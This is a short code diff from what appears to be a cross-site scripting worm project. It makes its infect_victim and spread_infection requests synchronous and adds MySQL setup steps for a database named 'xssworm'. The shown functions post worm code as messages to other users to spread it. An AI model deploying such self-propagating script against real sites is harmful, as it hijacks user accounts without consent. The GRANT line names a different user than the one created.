@@ -35,7 +35,7 @@ xxxx
 	function infect_victim(color) {
 		var xhr = new XMLHttpRequest();
 		var params = "color="+color;
-		xhr.open("POST", url+"/update", true);
+		xhr.open("POST", url+"/update", false);
 		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 		xhr.send(params);
 	}
@@ -47,7 +47,7 @@ xxxx
 	function spread_infection(id,infection_code) {
 		var xhr = new XMLHttpRequest();
 		var params = "id="+id+"&msg="+encodeURIComponent(infection_code);
-		xhr.open("POST", url+"/send-message", true);
+		xhr.open("POST", url+"/send-message", false);
 		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 		xhr.send(params);
 	}
@@ -115,6 +115,15 @@ server {
 ### MySQL database
 
 ```
+$ mysql -u root -p
+$ CREATE DATABASE xssworm;
+$ mysql -u root -p xssworm < file.sql
+
+$ CREATE USER 'xssworm'@'localhost' IDENTIFIED BY 'password';
+$ GRANT ALL PRIVILEGES ON xssworm.* TO 'newuser'@'localhost';
+$ FLUSH PRIVILEGES;
+
+$ show variables like "max_connections";
 ```
 
 ## References
